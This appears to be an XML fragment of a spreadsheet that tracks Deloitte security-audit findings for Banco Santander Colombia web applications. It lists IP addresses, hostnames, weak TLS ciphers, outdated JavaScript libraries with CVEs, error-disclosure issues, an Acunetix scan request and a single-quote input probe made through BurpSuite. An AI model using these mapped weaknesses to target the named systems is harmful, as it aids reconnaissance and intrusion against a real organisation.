    <s v="Web de Proveedores"/>
    <s v="MAN-7446a64b"/>
    <s v="CO-009-008"/>
    <x v="5"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3000001907348633"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2018-04-17T00:00:00"/>
    <n v="2989"/>
    <d v="2018-07-16T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="Durante la realización de las pruebas se ha detectado que en las respuestas del servidor se_x000a_muestra información sobre el tipo de servidor donde se aloja la aplicación"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la estructura interna de la misma, así como de las tecnologías utilizadas para el desarrollo de la misma o de la infraestructura que la sustenta. Este tipo de información puede ser accesible a través de las cabeceras de respuesta de la aplicación, mensajes de error y/o páginas por defecto."/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas_x000a_para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta_x000a_información podría ser utilizada por un atacante con el objetivo de recabar información para_x000a_ataques futuros."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="7"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-011"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-28ad4540"/>
    <s v="CO-004-001"/>
    <x v="6"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3000001907348633"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2016-08-26T00:00:00"/>
    <n v="3588"/>
    <d v="2016-11-24T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <m/>
    <m/>
    <s v="La exposición de información acerca de las funcionalidades o rutas internas de la aplicación_x000a_puede implicar a un atacante obtener una mayor comprensión del sistema en uso y,_x000a_potencialmente, desarrollar más ataques para apuntar a la aplicación web."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="8"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="Wep App"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-cc489697"/>
    <s v="CO-19-AUTO-01-CO-001"/>
    <x v="7"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3000001907348633"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-04-25T00:00:00"/>
    <n v="2616"/>
    <d v="2019-07-24T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="Las librerias Javascript utilizadas se encuentran desactualizadas. [+]Request: GET https://confirming.santander.com.co /WebProveedoresNala/common/js/prototype.js HTTP/1.1 Pragma: no-cache Cache-Control: no-cache Referer: https://confirming.santander.com.co/WebProveedoresNala/WebPipe Acunetix-Aspect: enabled Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c Acunetix-Aspect-Queries: filelist;aspectalerts Host: confirming.santander.com.co_x000a_Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Accept: */* [+]Response: HTTP/1.1 200 OK Date: Fri, 22 Mar 2019 07:12:48 GMT Server: Apache Strict-Transport-Security: max-age=63072000; includeSubdomains; X-Frame-Options: SAMEORIGIN X-XSS-Protection: 1; mode=block Last-Modified: Tue, 14 Oct 2014 17:19:04 GMT Content-Length: 124136 Keep-Alive: timeout=10, max=185 Connection: Keep-Alive Content-Type: application/x-javascript Content-Language: en-US /* Prototype JavaScript framework, version 1.6.0 * (c) 2005-2007 Sam Stephenson * * Prototype is freely distributable under the terms of an MIT-style license. * For details, see the Prototype web site: http://www.prototypejs.org/ * *--------------------------------------------------------------------------*/"/>
    <s v="Se recomienda utilizar versiones actualizadas del software y/o plataformas tecnológicas utilizadas, en caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada."/>
    <s v="El software o plataforma utilizada no se encuentra actualizado a la última versión disponible. Esto implica que podría ser susceptible de poder ser comprometido mediante vulnerabilidades conocidas que pudieran poner en riesgo el activo afectado."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="9"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-017"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-73a2e320"/>
    <s v="CO-19-MANU-01-AP-002"/>
    <x v="8"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="4.3000001907348633"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-05-24T00:00:00"/>
    <n v="2587"/>
    <d v="2019-08-22T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="El activo &quot;confirming.santander.com&quot; permite el uso del algoritmo de cifrado 3DES"/>
    <s v="Se recomienda deshabilitar el uso del algoritmo de cifrado 3DES y reconfigurar el servicio afectado para restringir los métodos de cifrado a aquellos que ofrezcan un nivel de seguridad alto."/>
    <s v="El host analizado permite el uso de cifrados SSL de seguridad media basados en el algoritmo de cifrado 3DES. Este algoritmo de cifrado es vulnerable a un ataque conocido como Sweet32. Debido a que 3DES tiene un tamaño de bloque de 64 bits, existe una alta probabilidad de que, dados los bloques 2^32, se encuentren dos bloques que colisionen. Una vez que se ha encontrado una colisión entre dos bloques en texto cifrado, se puede averiguar cómo se relacionan los bloques en texto plano correspondientes. Este conocimiento combinado con varios otros atributos permite el descifrado del texto cifrado."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="10"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-019"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-73a2e322"/>
    <s v="CO-19-MANU-01-CO-004"/>
    <x v="9"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="4"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-05-24T00:00:00"/>
    <n v="2587"/>
    <d v="2019-08-22T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="El activo &quot;confirming.santander.com.co&quot; es vulnerable a LogJam"/>
    <s v="Se recomienda configurar el servicio para usar un único módulo de Diffie-Hellman de 2048 bits o mayor."/>
    <s v="El servidor permite conexiones SSL/TLS con uno o más modulos Diffie-Hellman menor o igual a 1024 bits. A través de Criptoanálisis, un usuario malintencionado podría ser capaz de encontrar la clave compartida en un corto periodo de tiempo (dependiendo del tamaño del módulo y de los recursos del atacante). Esto podría permitir al atacante recupera la información en texto plano o violar la integridad de las conexiones."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="11"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-015"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-a6e6676b"/>
    <s v="CO-174-001"/>
    <x v="10"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="3.7000000476837158"/>
    <s v="CVE-2013-0169"/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2018-04-17T00:00:00"/>
    <n v="2989"/>
    <d v="2018-08-15T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="se ha detectado que el certificado del servidor (www.santander.com.co) ofrece algortimos de cifrado en modo bloque (CBC)"/>
    <s v="Deshabilitar el uso de algoritmos cifrado de bloques (CBC) en el servidor remoto."/>
    <s v="El servidor us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_x000a_ CVEs Asociados _x000a_•CVE-2013-0169"/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="12"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-010"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-647bb2ad"/>
    <s v="CO-19-MANU-02-AP-007"/>
    <x v="11"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="3.5"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-11-15T00:00:00"/>
    <n v="2412"/>
    <d v="2020-03-14T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="se ha identificado la ausencia de la cabecera CSP (Content_Security_Policy)_x000a_mediante las cabeceras de respuesta http"/>
    <s v="Configure el servidor web para devolver la cabecera Content-Security-Policy HTTP. Es_x000a_recomendable que se establezca la política “default-src ‘self’ para que el contenido provenga_x000a_del mismo origen del sitio. Un ejemplo de la política sería:_x000a_Content-Security-Policy: default-src 'self'"/>
    <s v="CSP (Content Security Policy) es una capa añadida de seguridad que ayuda a detectar y mitigar determinados tipos de ataques, incluyendo ataques Cross-Site Scripting (XSS) y de inyección de datos. Estos ataques se pueden utilizar para realizar todo tipo de técnicas, desde el robo de datos hasta site defacement, pasando por la distribución de malware. CSP proporciona una serie de cabeceras HTTP estándar que permiten que los propietarios de los sitios web declaren que fuentes de contenido se consideran legitimas para que los puedan usarlas. Por ejemplo, JavaScript, CSS, tramas HTML, fuentes, imágenes y archivos incrustables como applets Java, ActiveX y archivos de audio y vídeo."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="13"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-018"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-73a2e327"/>
    <s v="CO-19-MANU-01-AP-008"/>
    <x v="12"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="3.2000000476837158"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-05-24T00:00:00"/>
    <n v="2587"/>
    <d v="2019-09-21T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema de_x000a_ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo de_x000a_recabar información para ataques futuros."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como pueden ser rutas internas o ubicación de ficheros o directorios dentro del mismo. Para ello, se recomienda modificar la página de error &quot;404 not found&quot;."/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema_x000a_de ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo_x000a_de recabar información para ataques futuros."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="14"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-020"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-73a2e326"/>
    <s v="CO-19-MANU-01-CO-007"/>
    <x v="13"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2.5999999046325684"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-05-24T00:00:00"/>
    <n v="2587"/>
    <d v="2019-09-21T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="El activo &quot;confirming.santander.com.co &quot; es vulnerable a SWEET32"/>
    <s v="Se recomienda reconfigurar la aplicación afectada, si es posible, para evitar el uso de todos los_x000a_cifrados de bloques de 64 bits. Como alternativa, coloque limitaciones en el número de solicitudes que se permiten procesar sobre la misma conexión TLS para mitigar esta vulnerabilidad."/>
    <s v="El servidor admite el uso de un cifrado de bloque con bloques de 64 bits en una o más suites_x000a_de cifrado. Está afectado por una vulnerabilidad, conocida como SWEET32, debido al uso de_x000a_cifrados débiles._x000a_Un ataque Man in the Middle con recursos suficientes puede explotar esta vulnerabilidad."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="15"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_N_06"/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-18af2323"/>
    <s v="CO-19-AUTO-02-CO-002"/>
    <x v="3"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.5999999046325684"/>
    <m/>
    <s v="64.76.90.137"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-09-11T00:00:00"/>
    <n v="2477"/>
    <d v="2019-12-10T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 28/12/2020"/>
    <s v="1ª Fecha: 18/12/2020"/>
    <d v="2020-09-15T00:00:00"/>
    <s v="Se encuentra el uso de funciones de Zoom Search Engine 5.0: /factoring/ayuda/zoom_search.js"/>
    <s v="Se recomienda utilizar versiones actualizadas del software y/o plataformas tecnológicas utilizadas, en caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada."/>
    <s v="El software o plataforma utilizada no se encuentra actualizado a la última versión disponible. Esto implica que podría ser susceptible de poder ser comprometido mediante vulnerabilidades conocidas que pudieran poner en riesgo el activo afectado."/>
    <s v="Sin definir"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="16"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_N_05"/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-18af2329"/>
    <s v="CO-19-AUTO-02-CO-008"/>
    <x v="14"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.3000001907348633"/>
    <m/>
    <s v="64.76.90.137"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-09-11T00:00:00"/>
    <n v="2477"/>
    <d v="2019-12-10T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 28/12/2020"/>
    <s v="1ª Fecha: 18/12/2020"/>
    <d v="2020-12-16T00:00:00"/>
    <m/>
    <s v="Se recomienda actualizar el servidor web a la última versión, ya que las últimas versiones de Apache y nginx no permiten la renegociación SSL iniciada por el cliente."/>
    <s v="El proceso de negociación del cifrado SSL utiliza significativamente más recursos en el servidor que en el cliente. Si el cliente puede iniciar el proceso de renegociación, un atacante puede hacer que el servidor deje de estar disponible con un ataque de denegación de servicio."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="17"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_N_03"/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-647bb2aa"/>
    <s v="CO-19-MANU-02-AP-004"/>
    <x v="15"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.5"/>
    <m/>
    <s v="64.76.90.137"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-11-15T00:00:00"/>
    <n v="2412"/>
    <d v="2020-03-14T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 28/12/2020"/>
    <s v="1ª Fecha: 18/12/2020"/>
    <d v="2021-02-08T00:00:00"/>
    <s v="Durante la auditoria se ha identificado la librería de JavaScript jQuery en su versión 1.3.2 la cual_x000a_contiene vulnerabilidades, con CVE asociado, conocidas como:_x000a_ CVE-2019-11358_x000a_ CVE-2016-10707_x000a_ CVE-2016-7103_x000a_ CVE-2015-9251_x000a_ CVE-2014-6071_x000a_ CVE-2012-6708_x000a_ CVE-2011-4969_x000a_ CVE-2007-2379_x000a_Adicionalmente, se ha identificado el Framework de JavaScript “Prototype” en su versión 1.6.0.3_x000a_la cual contiene vulnerabilidades, con CVE asociado, conocidas como:_x000a_ CVE-2008-7220_x000a_ CVE-2007-2383"/>
    <s v="Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión_x000a_disponible. En concreto:_x000a_ Prototype. Última versión estable 1.7.3 (http://prototypejs.org/)_x000a_ jQuery. Última versión estable 3.4.1 (https://jquery.com/download/)_x000a_Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las_x000a_librerías en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial."/>
    <s v="Un individuo malicioso podría comprometer con mayor facilidad las librerías afectadas, ya que_x000a_las versiones observadas poseen vulnerabilidades y/o debilidades de seguridad previamente_x000a_reportadas. Las vulnerabilidades mencionadas son de conocimiento público y los detalles de_x000a_las mismas se encuentran disponibles. En consecuencia, un individuo malicioso podría intentar_x000a_explotarlas para comprometer a los usuarios de la aplicación."/>
    <d v="2021-01-23T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="18"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_N_04"/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-647bb2ab"/>
    <s v="CO-19-MANU-02-AP-005"/>
    <x v="16"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.5"/>
    <m/>
    <s v="64.76.90.137"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-11-15T00:00:00"/>
    <n v="2412"/>
    <d v="2020-03-14T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 28/12/2020"/>
    <s v="1ª Fecha: 18/12/2020"/>
    <d v="2020-09-15T00:00:00"/>
    <s v="se ha identificado que, al modificar la petición original, el servidor_x000a_responde con un error, mostrando una función interna de la aplicación. En concreto:_x000a_ https://confirming-factoring.santander.com.co_x000a_ Menú: Consultar ejecuciones Generales /Procesos Automáticos_x000a_Al realizar una búsqueda, se para la petición mediante un proxy intermedio (BurpSuite) y se_x000a_modifica el campo “formSearchCiclo%3Afecha_desdeField%3Aecha_inicioInputCurrentDate”_x000a_introduciendo un valor no esperado por la aplicación, por ejemplo, una comilla simple, la aplicación responde mostrando información_x000a_interna de la aplicación, en concreto una función de Java_x000a_"/>
    <s v="Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente,_x000a_y realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un_x000a_posible atacante._x000a_Adicionalmente para no proporcionar información al atacante se recomienda personalizar las_x000a_páginas de error para que no sean descriptivas."/>
    <s v="El servidor Web al recibir una petición no esperada reacciona mostrando una página de error_x000a_que revela información sensible de la plataforma subyacente. Con esta información un_x000a_atacante puede realizar ataques dirigidos con mayor criticidad y éxito sobre los sistemas y_x000a_aplicaciones."/>
    <s v="Sin definir"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="19"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-101"/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-4c3ceca0"/>
    <s v="CO-19-MANU-01-VE-009"/>
    <x v="17"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="7.6999998092651367"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-08-20T00:00:00"/>
    <n v="2499"/>
    <d v="2019-08-30T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:23/08/2020"/>
    <d v="2020-10-13T00:00:00"/>
    <s v="La confirmación del uso de una versión vulnerable de la biblioteca javascript_x000a_Https://www.santander.com.co/js/jquery-1.10,2.min.js_x000a_Version: Jquery 1.10.2"/>
    <s v="Actualizar las librerias de JavaScript a la última versión"/>
    <s v="Se detectaron bibliotecas Java Script Jquery obsoletas, las cuales pueden ser explotadas mediante secuencias de comandos entre sitios (XSS)."/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="20"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200611_R"/>
    <s v="BSNC-2019-102"/>
    <s v="Portal Web"/>
    <s v="MAN-4c3ced42"/>
    <s v="CO-19-MANU-01-VE-010"/>
    <x v="18"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="7.6999998092651367"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-08-23T00:00:00"/>
    <n v="2496"/>
    <d v="2019-09-02T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 17/12/2019_x000a_2ª Fecha: 11/06/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 04/09/2020"/>
    <d v="2020-08-28T00:00:00"/>
    <s v="La confirmación del uso de una versión vulnerable de la biblioteca javascript_x000a_https://www.santander.com.co/js/bootstrap.min.js_x000a_Versión:Bootstrap 3.0.2"/>
    <s v="Actualizar las librerias de Bootstrap a la última versión"/>
    <s v="Se detectaron bibliotecas Bootstrap obsoletas, las cuales pueden ser explotadas mediante secuencias de comandos entre sitios (XSS). Esto puede conducir a diferentes problemas para los usuarios de la aplicación."/>
    <d v="2020-09-04T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="21"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-647bb2a7"/>
    <s v="CO-19-MANU-02-AP-001"/>
    <x v="19"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-11-15T00:00:00"/>
    <n v="2412"/>
    <d v="2020-02-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-07-02T00:00:00"/>
    <s v="Se ha evidenciado una serie de nombres de usuarios en los metadatos de_x000a_los ficheros PDF, los cuales se han identificado dentro de las páginas webs del alcance."/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos_x000a_generados y/o publicados en la aplicación. Adicionalmente, se recomienda implementar un_x000a_procedimiento para controlar los documentos a publicar para garantizar que los mismos no_x000a_contengan información sensible de la organización en sus metadatos."/>
    <s v="Los metadatos de un fichero o documento pueden revelar tanta o más información que el_x000a_contenido de las comunicaciones. Las fugas de información sensible son realizadas, en_x000a_numerosas ocasiones, a través de los metadatos de los ficheros publicados, que desvelan entre_x000a_otros datos, usuarios o nombres de personas de la empresa."/>
    <d v="2020-07-24T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="22"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-002"/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-18af232a"/>
    <s v="CO-19-AUTO-02-CO-007"/>
    <x v="14"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="4.3000001907348633"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-09-11T00:00:00"/>
    <n v="2477"/>
    <d v="2019-12-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-03-27T00:00:00"/>
    <m/>
    <s v="Se recomienda actualizar el servidor web a la última versión, ya que las últimas versiones de Apache y nginx no permiten la renegociación SSL iniciada por el cliente."/>
    <s v="El proceso de negociación del cifrado SSL utiliza significativamente más recursos en el servidor que en el cliente. Si el cliente puede iniciar el proceso de renegociación, un atacante puede hacer que el servidor deje de estar disponible con un ataque de denegación de servicio."/>
    <m/>
    <s v="Corresponde a un Falso Positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="23"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200612_N_08"/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-647bb2ac"/>
    <s v="CO-19-MANU-02-AP-006"/>
    <x v="20"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.5"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-11-15T00:00:00"/>
    <n v="2412"/>
    <d v="2020-03-14T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 12/06/2020"/>
    <s v="2ª Fecha: 13/11/2020"/>
    <d v="2020-10-13T00:00:00"/>
    <s v="se han identificado métodos http los cuales no son seguros y podrían_x000a_suponer un riesgo para el servidor, en concreto, se han detectado los métodos: PUT, DELETE,_x000a_TRACE y PATCH."/>
    <s v="Se recomienda analizar la posibilidad de evaluar si el método HTTP extendido identificado es_x000a_requerido por razones de negocio y deshabilitarlo en caso de no ser requerido. Asimismo, se_x000a_recomienda analizar la posibilidad de revisar los estándares de configuración de los sistemas,_x000a_para asegurar que métodos potencialmente peligrosos se encuentren deshabilitados y_x000a_asegurar su consistencia en toda la organización."/>
    <s v="Los servidores Web utilizan ciertos métodos o funciones propias del protocolo HTTP para_x000a_funcionar siendo los más utilizados GET, POST y HEAD. Como resultado del análisis de los_x000a_servicios Web internos se ha detectado que los recursos afectados permiten utilizar métodos_x000a_HTTP adicionales (OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL,_x000a_PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH) los cuales podrían no ser requeridos_x000a_debilitando la seguridad de dichos servicios Web."/>
    <d v="2020-11-13T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="24"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-001"/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-73a2e325"/>
    <s v="CO-19-MANU-01-AP-006"/>
    <x v="21"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.2000000476837158"/>
